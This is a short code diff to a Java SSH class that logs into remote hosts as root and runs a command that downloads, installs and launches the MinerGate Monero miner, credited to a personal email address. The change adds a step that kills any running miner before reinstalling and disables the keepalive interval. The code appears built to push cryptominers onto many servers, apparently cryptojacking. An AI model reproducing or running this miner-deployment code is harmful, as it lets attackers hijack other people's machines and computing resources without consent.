@@ -19,7 +19,7 @@ public class ConnectSSH {
     public void connectSSH(AccountInfo accountInfo ,Session session ) {
         
         try {
-            String cmd = "sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1";
+            String cmd = "sudo pkill -f minergate-cli || sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1";
             
             String host = accountInfo.getIp();
             String user = "root";
@@ -37,7 +37,7 @@ public class ConnectSSH {
             session.setConfig("cipher.c2s",
                     "blowfish-cbc,3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-ctr,arcfour,arcfour128,arcfour256");
 
-            session.setServerAliveInterval(30000);
+            //session.setServerAliveInterval(30000);
             session.connect();
 
             ChannelExec channel = (ChannelExec) session.openChannel("exec");
